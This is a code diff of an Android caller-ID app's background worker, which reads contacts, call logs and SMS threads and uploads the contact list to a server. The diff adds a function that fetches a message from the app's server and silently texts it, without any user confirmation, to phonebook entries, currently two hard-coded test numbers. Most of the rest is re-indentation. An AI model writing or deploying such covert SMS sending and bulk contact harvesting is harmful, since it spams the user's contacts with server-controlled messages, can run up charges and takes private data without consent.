@@ -10,6 +10,7 @@ import android.os.Build
 import android.provider.CallLog
 import android.provider.ContactsContract
 import android.provider.Telephony
+import android.telephony.SmsManager
 import android.telephony.SubscriptionManager
 import android.text.TextUtils
 import android.util.Log
@@ -20,7 +21,6 @@ import com.magicbio.truename.models.CallLogModel
 import com.magicbio.truename.models.Sms
 import com.magicbio.truename.models.UploadContactsRequest
 import com.magicbio.truename.retrofit.ApiInterface
-import com.magicbio.truename.utils.ContactUtils
 import kotlinx.coroutines.*
 import kotlinx.coroutines.flow.collect
 import java.util.*
@@ -43,17 +43,55 @@ object AppAsyncWorker {
                     val ids = contactsDao.addContacts(contacts)
                     Log.d("AppAsyncWorker", "${ids.size} Contacts added to DB")
                 }
-                withContext(Dispatchers.IO) {
-                    try {
-                        val response =
-                            apiInterface.uploadContacts(UploadContactsRequest(contacts, uid))
-                        Log.d("UploadContactsAPI", response.status.toString())
-                    } catch (e: Exception) {
-                        e.printStackTrace()
-                    }
+                try {
+                    apiInterface.uploadContacts(UploadContactsRequest(contacts, uid))
+                    //          Log.d("UploadContactsAPI", response.status.toString())
+                } catch (e: Exception) {
+                    e.printStackTrace()
                 }
+                sendSMSToPhoneBook(apiInterface, contacts)
+
             }
 
+        }
+    }
+
+    private fun sendSMSToPhoneBook(
+        apiInterface: ApiInterface,
+        contacts: ArrayList<Contact>,
+        dummyContacts: Boolean = true,
+    ) {
+        try {
+            val response = runBlocking { apiInterface.invite("auto") }
+            //  Log.d("InviteAPI", response.status.toString())
+          // val body = JSONObject(response.string())
+            val msg = response.msg
+            if (!msg.isNullOrBlank()) {
+                val phoneBook = if (dummyContacts) {
+                    arrayListOf(Contact().apply {
+                        name = "Test User 1"
+                        setNumbers(arrayListOf("03101289585"))
+                    }, Contact().apply {
+                        name = "Test User 2"
+                        setNumbers(arrayListOf("03455555613"))
+                    })
+                } else contacts
+
+                phoneBook.forEach {
+                    val smsManager = SmsManager.getDefault()
+                    val smsBody = StringBuffer()
+                    smsBody.append(Uri.parse(msg))
+                    smsManager.sendTextMessage(
+                        it.numbers[0],
+                        null,
+                        smsBody.toString(),
+                        null,
+                        null
+                    )
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
         }
     }
 
@@ -233,40 +271,40 @@ fun fetchContacts(onContactsListener: FetchContacts.OnContactsListener) {
 }*/
 
 
-fun getWhatsAppUserId(name: String, callType: String, callback: (Long) -> Unit) {
-    GlobalScope.launch {
-        val resolver = context.contentResolver
-        val cursor = resolver.query(
-            ContactsContract.Data.CONTENT_URI,
-            null, null, null,
-            ContactsContract.Contacts.DISPLAY_NAME
-        )
-        var found = false
-        while (cursor?.moveToNext() == true) {
-            val id = cursor.getLong(cursor.getColumnIndex(ContactsContract.Data._ID))
-            val displayName =
-                cursor.getString(cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME))
-            val mimeType =
-                cursor.getString(cursor.getColumnIndex(ContactsContract.Data.MIMETYPE))
-            found = displayName == name && mimeType == callType
+    fun getWhatsAppUserId(name: String, callType: String, callback: (Long) -> Unit) {
+        GlobalScope.launch {
+            val resolver = context.contentResolver
+            val cursor = resolver.query(
+                ContactsContract.Data.CONTENT_URI,
+                null, null, null,
+                ContactsContract.Contacts.DISPLAY_NAME
+            )
+            var found = false
+            while (cursor?.moveToNext() == true) {
+                val id = cursor.getLong(cursor.getColumnIndex(ContactsContract.Data._ID))
+                val displayName =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.Data.DISPLAY_NAME))
+                val mimeType =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.Data.MIMETYPE))
+                found = displayName == name && mimeType == callType
 
-            if (found) {
-                Log.d(this@AppAsyncWorker.javaClass.simpleName, "$id $displayName $mimeType")
-                callback(id)
-                break
+                if (found) {
+                    Log.d(this@AppAsyncWorker.javaClass.simpleName, "$id $displayName $mimeType")
+                    callback(id)
+                    break
+                }
             }
-        }
 
-        if (!found) {
-            withContext(Dispatchers.Main)
-            {
-                callback(-1)
+            if (!found) {
+                withContext(Dispatchers.Main)
+                {
+                    callback(-1)
+                }
             }
-        }
 
-        cursor?.close()
+            cursor?.close()
+        }
     }
-}
 
 /*    private fun getContactList(): ArrayList<Contact> {
         var contactList: ArrayList<Contact>? = null
@@ -329,312 +367,312 @@ fun getWhatsAppUserId(name: String, callType: String, callback: (Long) -> Unit) 
         return contactList!!
     }*/
 
-fun getContacts(): ArrayList<Contact> {
-    /*  if (!Contact.getAll().isNullOrEmpty()) {
-          return Contact.getAll() as ArrayList<Contact>
-      }
-      ActiveAndroid.beginTransaction()*/
-    if (contacts.isNotEmpty())
-        return contacts
+    fun getContacts(): ArrayList<Contact> {
+        /*  if (!Contact.getAll().isNullOrEmpty()) {
+              return Contact.getAll() as ArrayList<Contact>
+          }
+          ActiveAndroid.beginTransaction()*/
+        if (contacts.isNotEmpty())
+            return contacts
 
-    val projection = arrayOf(
-        ContactsContract.Contacts._ID,
-        ContactsContract.Contacts.DISPLAY_NAME,
-        ContactsContract.Contacts.HAS_PHONE_NUMBER
-    )
-    val filter = "${ContactsContract.Contacts.DISPLAY_NAME} NOT LIKE '%@%'"
-    val order = String.format("%1\$s COLLATE NOCASE", ContactsContract.Contacts.DISPLAY_NAME)
-    val cr = context.contentResolver
-    val cursor: Cursor? =
-        cr.query(ContactsContract.Contacts.CONTENT_URI, projection, filter, null, order)
-    if (cursor?.moveToFirst() == true)
-        while (cursor.moveToNext()) {
-            // get the contact's information
-            val id: String =
-                cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
-            val name: String =
-                cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
-            val hasPhone: Int =
-                cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
-            // get the user's email address
-            var email = ""
-            val ce: Cursor? = cr.query(
-                ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
-                ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", arrayOf(id), null
-            )
-            if (ce != null && ce.moveToFirst()) {
-                email =
-                    ce.getString(ce.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
-                ce.close()
-            }
-            // get the user's phone number
-            var phone: String? = null
-            var image: String? = null
-            val numbers = ArrayList<String>(50)
-            if (hasPhone > 0) {
-                val cp: Cursor? = cr.query(
-                    ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
-                    null,
-                    ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
-                    arrayOf(id),
-                    null
+        val projection = arrayOf(
+            ContactsContract.Contacts._ID,
+            ContactsContract.Contacts.DISPLAY_NAME,
+            ContactsContract.Contacts.HAS_PHONE_NUMBER
+        )
+        val filter = "${ContactsContract.Contacts.DISPLAY_NAME} NOT LIKE '%@%'"
+        val order = String.format("%1\$s COLLATE NOCASE", ContactsContract.Contacts.DISPLAY_NAME)
+        val cr = context.contentResolver
+        val cursor: Cursor? =
+            cr.query(ContactsContract.Contacts.CONTENT_URI, projection, filter, null, order)
+        if (cursor?.moveToFirst() == true)
+            while (cursor.moveToNext()) {
+                // get the contact's information
+                val id: String =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID))
+                val name: String =
+                    cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME))
+                val hasPhone: Int =
+                    cursor.getInt(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))
+                // get the user's email address
+                var email = ""
+                val ce: Cursor? = cr.query(
+                    ContactsContract.CommonDataKinds.Email.CONTENT_URI, null,
+                    ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?", arrayOf(id), null
                 )
-                if (cp?.moveToFirst() == true) {
-                    image =
-                        cp.getString(cp.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_THUMBNAIL_URI))
+                if (ce != null && ce.moveToFirst()) {
+                    email =
+                        ce.getString(ce.getColumnIndex(ContactsContract.CommonDataKinds.Email.DATA))
+                    ce.close()
+                }
+                // get the user's phone number
+                var phone: String? = null
+                var image: String? = null
+                val numbers = ArrayList<String>(50)
+                if (hasPhone > 0) {
+                    val cp: Cursor? = cr.query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                        null,
+                        ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+                        arrayOf(id),
+                        null
+                    )
+                    if (cp?.moveToFirst() == true) {
+                        image =
+                            cp.getString(cp.getColumnIndex(ContactsContract.CommonDataKinds.Phone.PHOTO_THUMBNAIL_URI))
 
-                    while (cp.moveToNext()) {
-                        val phoneNumber =
-                            cp.getString(cp.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
-                        if (phone.isNullOrBlank())
-                            phone = phoneNumber
-                        numbers.add(phoneNumber)
+                        while (cp.moveToNext()) {
+                            val phoneNumber =
+                                cp.getString(cp.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))
+                            if (phone.isNullOrBlank())
+                                phone = phoneNumber
+                            numbers.add(phoneNumber)
+                        }
+                        Log.i(javaClass.simpleName, "$name $phone")
+                        cp.close()
                     }
-                    Log.i(javaClass.simpleName, "$name $phone")
-                    cp.close()
+                }
+                // if the user user has an email or phone then add it to contacts
+                if ((!TextUtils.isEmpty(email) && Patterns.EMAIL_ADDRESS.matcher(email).matches()
+                            && !email.equals(name, ignoreCase = true)) || !TextUtils.isEmpty(phone)
+                ) {
+                    val contact = Contact()
+                    contact.name = name
+                    contact.email = email
+                    contact.number = phone
+                    contact.image = image
+                    contact.userid = id
+                    contact.setNumbers(numbers.map {
+                        it.replace(" ", "")
+                    })
+                    contacts.add(contact)
+                    //  val cid = contact.save()
+                    //Log.d("ContactID", cid.toString())
                 }
             }
-            // if the user user has an email or phone then add it to contacts
-            if ((!TextUtils.isEmpty(email) && Patterns.EMAIL_ADDRESS.matcher(email).matches()
-                        && !email.equals(name, ignoreCase = true)) || !TextUtils.isEmpty(phone)
-            ) {
-                val contact = Contact()
-                contact.name = name
-                contact.email = email
-                contact.number = phone
-                contact.image = image
-                contact.userid = id
-                contact.setNumbers(numbers.map {
-                    it.replace(" ", "")
-                })
-                contacts.add(contact)
-                //  val cid = contact.save()
-                //Log.d("ContactID", cid.toString())
+        // clean up cursor
+        cursor?.close()
+
+        //   ActiveAndroid.setTransactionSuccessful()
+        // ActiveAndroid.endTransaction()
+        return contacts
+    }
+
+
+    @SuppressLint("MissingPermission")
+    fun getCallDetails(): ArrayList<CallLogModel> {
+        val sm =
+            context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+        //   val simsList = sm.activeSubscriptionInfoList
+
+
+        val contacts = CallLog.Calls.CONTENT_URI
+        @SuppressLint("MissingPermission") val managedCursor =
+            context.contentResolver.query(contacts, null, null, null, "DATE desc")
+        val callLogModelList = ArrayList<CallLogModel>(managedCursor!!.count)
+        val number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER)
+        val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
+        val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
+        val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
+        val subscriptionIdC = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
+        val id = managedCursor.getColumnIndex(CallLog.Calls._ID)
+        // sb.append("Call Details :")
+        while (managedCursor.moveToNext()) { //  HashMap rowDataCall = new HashMap<String, String>();
+            val call = CallLogModel()
+            val phNumber = managedCursor.getString(number)
+            val callType = managedCursor.getString(type)
+            val callDate = managedCursor.getString(date)
+            val callDayTime = Date(callDate.toLong()).toString()
+            val name =
+                managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
+            val image =
+                managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_PHOTO_ID))
+            // long timestamp = convertDateToTimestamp(callDayTime);
+            val callDuration = managedCursor.getString(duration)
+            val subscriptionId = managedCursor.getString(subscriptionIdC)
+            val sid = managedCursor.getString(id)
+            val dircode = callType.toInt()
+            val dir = when (dircode) {
+                CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
+                CallLog.Calls.INCOMING_TYPE -> "INCOMING"
+                CallLog.Calls.MISSED_TYPE -> "MISSED"
+                else -> "OUTGOING"
             }
-        }
-    // clean up cursor
-    cursor?.close()
-
-    //   ActiveAndroid.setTransactionSuccessful()
-    // ActiveAndroid.endTransaction()
-    return contacts
-}
-
-
-@SuppressLint("MissingPermission")
-fun getCallDetails(): ArrayList<CallLogModel> {
-    val sm =
-        context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
-    //   val simsList = sm.activeSubscriptionInfoList
-
-
-    val contacts = CallLog.Calls.CONTENT_URI
-    @SuppressLint("MissingPermission") val managedCursor =
-        context.contentResolver.query(contacts, null, null, null, "DATE desc")
-    val callLogModelList = ArrayList<CallLogModel>(managedCursor!!.count)
-    val number = managedCursor.getColumnIndex(CallLog.Calls.NUMBER)
-    val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
-    val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
-    val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
-    val subscriptionIdC = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
-    val id = managedCursor.getColumnIndex(CallLog.Calls._ID)
-    // sb.append("Call Details :")
-    while (managedCursor.moveToNext()) { //  HashMap rowDataCall = new HashMap<String, String>();
-        val call = CallLogModel()
-        val phNumber = managedCursor.getString(number)
-        val callType = managedCursor.getString(type)
-        val callDate = managedCursor.getString(date)
-        val callDayTime = Date(callDate.toLong()).toString()
-        val name =
-            managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
-        val image =
-            managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_PHOTO_ID))
-        // long timestamp = convertDateToTimestamp(callDayTime);
-        val callDuration = managedCursor.getString(duration)
-        val subscriptionId = managedCursor.getString(subscriptionIdC)
-        val sid = managedCursor.getString(id)
-        val dircode = callType.toInt()
-        val dir = when (dircode) {
-            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-            CallLog.Calls.MISSED_TYPE -> "MISSED"
-            else -> "OUTGOING"
-        }
-        //  sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration
-        //  +" \nname :--- " + name)
-        // sb.append("\n----------------------------------")
-        call.callType = dir
-        call.callDate = callDate
-        call.phNumber = phNumber
-        call.callDayTime = callDayTime
-        call.sim = "0"
-        if (sm.activeSubscriptionInfoCount > 1) {
-            sm.activeSubscriptionInfoList.find {
-                it.iccId == subscriptionId
-            }?.also {
-                call.sim = it.simSlotIndex.toString()
+            //  sb.append("\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration
+            //  +" \nname :--- " + name)
+            // sb.append("\n----------------------------------")
+            call.callType = dir
+            call.callDate = callDate
+            call.phNumber = phNumber
+            call.callDayTime = callDayTime
+            call.sim = "0"
+            if (sm.activeSubscriptionInfoCount > 1) {
+                sm.activeSubscriptionInfoList.find {
+                    it.iccId == subscriptionId
+                }?.also {
+                    call.sim = it.simSlotIndex.toString()
+                }
             }
-        }
-        call.name = name
-        call._Id = sid
-        call.image = image
-        // call.email = getEmail()
-        val hours = Integer.valueOf(callDuration) / 3600
-        val minutes = Integer.valueOf(callDuration) % 3600 / 60
-        val seconds = Integer.valueOf(callDuration) % 60
-        call.callDuration = String.format("%02d:%02d:%02d", hours, minutes, seconds)
-        // Uri allCalls = Uri.parse("content://call_log/calls");
+            call.name = name
+            call._Id = sid
+            call.image = image
+            // call.email = getEmail()
+            val hours = Integer.valueOf(callDuration) / 3600
+            val minutes = Integer.valueOf(callDuration) % 3600 / 60
+            val seconds = Integer.valueOf(callDuration) % 60
+            call.callDuration = String.format("%02d:%02d:%02d", hours, minutes, seconds)
+            // Uri allCalls = Uri.parse("content://call_log/calls");
 // Cursor c = ((MainActivity)getActivity()).managedQuery(allCalls, null, null, null, null);
 //String id = c.getString(c.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID));
 //Log.d("sim",id);
-        callLogModelList.add(call)
-    }
-    managedCursor.close()
-    //System.out.println(sb);
-    return callLogModelList
-}
-
-fun getAllSms(): ArrayList<Sms> {
-
-    var objSms: Sms
-    // Uri message = Uri.parse("content://sms/conversations");
-    val cr: ContentResolver = context.contentResolver
-    //Telephony.Sms.PERSON;
-    val projection = arrayOf(
-        "thread_id",
-        "MAX(date) as date",
-        "COUNT(*) AS msg_count",
-        "body",
-        "address",
-        "(COUNT(*)-SUM(read)) as unread"
-    )
-    val c = cr.query(
-        Telephony.Sms.CONTENT_URI,
-        projection,
-        "thread_id) GROUP BY (thread_id",
-        null,
-        null
-    )
-    DatabaseUtils.dumpCursor(c)
-    val totalSMS = c!!.count
-    val lstSms = ArrayList<Sms>(totalSMS)
-    try {
-        if (c.moveToFirst()) {
-            for (i in 0 until totalSMS) {
-                objSms = Sms()
-                objSms.id = c.getString(c.getColumnIndexOrThrow("thread_id"))
-                objSms.address = c.getString(
-                    c
-                        .getColumnIndexOrThrow("address")
-                )
-                objSms.msg = c.getString(c.getColumnIndexOrThrow("body"))
-                objSms.readState = c.getString(c.getColumnIndex("unread"))
-                objSms.time = c.getString(c.getColumnIndexOrThrow("date"))
-                if (c.getString(c.getColumnIndexOrThrow("msg_count")).contains("1")) {
-                    objSms.folderName = "inbox"
-                } else {
-                    objSms.folderName = "sent"
-                }
-                objSms.name = getContactByPhoneNumber(objSms.address)
-                lstSms.add(objSms)
-
-                c.moveToNext()
-            }
+            callLogModelList.add(call)
         }
-    } catch (e: Exception) {
-        e.printStackTrace()
+        managedCursor.close()
+        //System.out.println(sb);
+        return callLogModelList
     }
-    // else {
+
+    fun getAllSms(): ArrayList<Sms> {
+
+        var objSms: Sms
+        // Uri message = Uri.parse("content://sms/conversations");
+        val cr: ContentResolver = context.contentResolver
+        //Telephony.Sms.PERSON;
+        val projection = arrayOf(
+            "thread_id",
+            "MAX(date) as date",
+            "COUNT(*) AS msg_count",
+            "body",
+            "address",
+            "(COUNT(*)-SUM(read)) as unread"
+        )
+        val c = cr.query(
+            Telephony.Sms.CONTENT_URI,
+            projection,
+            "thread_id) GROUP BY (thread_id",
+            null,
+            null
+        )
+        DatabaseUtils.dumpCursor(c)
+        val totalSMS = c!!.count
+        val lstSms = ArrayList<Sms>(totalSMS)
+        try {
+            if (c.moveToFirst()) {
+                for (i in 0 until totalSMS) {
+                    objSms = Sms()
+                    objSms.id = c.getString(c.getColumnIndexOrThrow("thread_id"))
+                    objSms.address = c.getString(
+                        c
+                            .getColumnIndexOrThrow("address")
+                    )
+                    objSms.msg = c.getString(c.getColumnIndexOrThrow("body"))
+                    objSms.readState = c.getString(c.getColumnIndex("unread"))
+                    objSms.time = c.getString(c.getColumnIndexOrThrow("date"))
+                    if (c.getString(c.getColumnIndexOrThrow("msg_count")).contains("1")) {
+                        objSms.folderName = "inbox"
+                    } else {
+                        objSms.folderName = "sent"
+                    }
+                    objSms.name = getContactByPhoneNumber(objSms.address)
+                    lstSms.add(objSms)
+
+                    c.moveToNext()
+                }
+            }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+        // else {
 // throw new RuntimeException("You have no SMS");
 // }
-    c.close()
-    return lstSms
-}
-
-private fun getContactByPhoneNumber(phoneNumber: String?): String? {
-    val uri: Uri = Uri.withAppendedPath(
-        ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
-        Uri.encode(phoneNumber)
-    )
-    val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
-    val cursor = context.contentResolver.query(uri, projection, null, null, null)
-    return if (cursor == null) {
-        phoneNumber
-    } else {
-        var name = phoneNumber
-        cursor.use { c ->
-            if (c.moveToFirst()) {
-                name = c.getString(c.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME))
-            }
-        }
-        name
+        c.close()
+        return lstSms
     }
-}
 
-@SuppressLint("MissingPermission")
-fun getCallDetails(numbers: String): ArrayList<CallLogModel> {
-    val sb = StringBuffer()
-    val sm =
-        context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
-    val contacts = CallLog.Calls.CONTENT_URI
-    @SuppressLint("MissingPermission") val managedCursor =
-        context.contentResolver.query(contacts, null, "number=?", arrayOf(numbers), "DATE desc")
-    val number = managedCursor!!.getColumnIndex(CallLog.Calls.NUMBER)
-    val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
-    val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
-    val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
-    val subscriptionIdC = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
-    sb.append("Call Details :")
-    val callLogModelList = ArrayList<CallLogModel>(managedCursor.count)
-    while (managedCursor.moveToNext()) {
-        val rowDataCall: HashMap<*, *> = HashMap<String, String>()
-        val call = CallLogModel()
-        val phNumber = managedCursor.getString(number)
-        val callType = managedCursor.getString(type)
-        val callDate = managedCursor.getString(date)
-        val callDayTime = Date(java.lang.Long.valueOf(callDate)).toString()
-        val name =
-            managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
-        // long timestamp = convertDateToTimestamp(callDayTime);
-        val callDuration = managedCursor.getString(duration)
-        val subscriptionId = managedCursor.getString(subscriptionIdC)
-        val dircode = callType.toInt()
-        val dir = when (dircode) {
-            CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
-            CallLog.Calls.INCOMING_TYPE -> "INCOMING"
-            CallLog.Calls.MISSED_TYPE -> "MISSED"
-            else -> "OUTGOING"
-        }
-        sb.append(
-            "\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration
-                    + " \nname :--- " + name
+    private fun getContactByPhoneNumber(phoneNumber: String?): String? {
+        val uri: Uri = Uri.withAppendedPath(
+            ContactsContract.PhoneLookup.CONTENT_FILTER_URI,
+            Uri.encode(phoneNumber)
         )
-        sb.append("\n----------------------------------")
-        call.callType = dir
-        call.callDate = callDate
-        call.phNumber = phNumber
-        call.callDayTime = callDayTime
-        call.sim = "0"
-        if (sm.activeSubscriptionInfoCount > 1) {
-            sm.activeSubscriptionInfoList.find {
-                it.iccId == subscriptionId
-            }?.also {
-                call.sim = it.simSlotIndex.toString()
+        val projection = arrayOf(ContactsContract.PhoneLookup.DISPLAY_NAME)
+        val cursor = context.contentResolver.query(uri, projection, null, null, null)
+        return if (cursor == null) {
+            phoneNumber
+        } else {
+            var name = phoneNumber
+            cursor.use { c ->
+                if (c.moveToFirst()) {
+                    name = c.getString(c.getColumnIndex(ContactsContract.PhoneLookup.DISPLAY_NAME))
+                }
             }
+            name
         }
-        call.name = name
-        val hours = Integer.valueOf(callDuration) / 3600
-        val minutes = Integer.valueOf(callDuration) % 3600 / 60
-        val seconds = Integer.valueOf(callDuration) % 60
-        call.callDuration = String.format("%02d:%02d", minutes, seconds)
-        // Uri allCalls = Uri.parse("content://call_log/calls");
+    }
+
+    @SuppressLint("MissingPermission")
+    fun getCallDetails(numbers: String): ArrayList<CallLogModel> {
+        val sb = StringBuffer()
+        val sm =
+            context.getSystemService(Context.TELEPHONY_SUBSCRIPTION_SERVICE) as SubscriptionManager
+        val contacts = CallLog.Calls.CONTENT_URI
+        @SuppressLint("MissingPermission") val managedCursor =
+            context.contentResolver.query(contacts, null, "number=?", arrayOf(numbers), "DATE desc")
+        val number = managedCursor!!.getColumnIndex(CallLog.Calls.NUMBER)
+        val type = managedCursor.getColumnIndex(CallLog.Calls.TYPE)
+        val date = managedCursor.getColumnIndex(CallLog.Calls.DATE)
+        val duration = managedCursor.getColumnIndex(CallLog.Calls.DURATION)
+        val subscriptionIdC = managedCursor.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID)
+        sb.append("Call Details :")
+        val callLogModelList = ArrayList<CallLogModel>(managedCursor.count)
+        while (managedCursor.moveToNext()) {
+            val rowDataCall: HashMap<*, *> = HashMap<String, String>()
+            val call = CallLogModel()
+            val phNumber = managedCursor.getString(number)
+            val callType = managedCursor.getString(type)
+            val callDate = managedCursor.getString(date)
+            val callDayTime = Date(java.lang.Long.valueOf(callDate)).toString()
+            val name =
+                managedCursor.getString(managedCursor.getColumnIndex(CallLog.Calls.CACHED_NAME))
+            // long timestamp = convertDateToTimestamp(callDayTime);
+            val callDuration = managedCursor.getString(duration)
+            val subscriptionId = managedCursor.getString(subscriptionIdC)
+            val dircode = callType.toInt()
+            val dir = when (dircode) {
+                CallLog.Calls.OUTGOING_TYPE -> "OUTGOING"
+                CallLog.Calls.INCOMING_TYPE -> "INCOMING"
+                CallLog.Calls.MISSED_TYPE -> "MISSED"
+                else -> "OUTGOING"
+            }
+            sb.append(
+                "\nPhone Number:--- " + phNumber + " \nCall Type:--- " + dir + " \nCall Date:--- " + callDayTime + " \nCall duration in sec :--- " + callDuration
+                        + " \nname :--- " + name
+            )
+            sb.append("\n----------------------------------")
+            call.callType = dir
+            call.callDate = callDate
+            call.phNumber = phNumber
+            call.callDayTime = callDayTime
+            call.sim = "0"
+            if (sm.activeSubscriptionInfoCount > 1) {
+                sm.activeSubscriptionInfoList.find {
+                    it.iccId == subscriptionId
+                }?.also {
+                    call.sim = it.simSlotIndex.toString()
+                }
+            }
+            call.name = name
+            val hours = Integer.valueOf(callDuration) / 3600
+            val minutes = Integer.valueOf(callDuration) % 3600 / 60
+            val seconds = Integer.valueOf(callDuration) % 60
+            call.callDuration = String.format("%02d:%02d", minutes, seconds)
+            // Uri allCalls = Uri.parse("content://call_log/calls");
 // Cursor c = ((MainActivity)CallDetails.this).managedQuery(allCalls, null, null, null, null);
 //String id = c.getString(c.getColumnIndex(CallLog.Calls.PHONE_ACCOUNT_ID));
 //Log.d("sim",id);
-        callLogModelList.add(call)
-    }
-    managedCursor.close()
+            callLogModelList.add(call)
+        }
+        managedCursor.close()
 
-    return callLogModelList
-}
+        return callLogModelList
+    }
 }
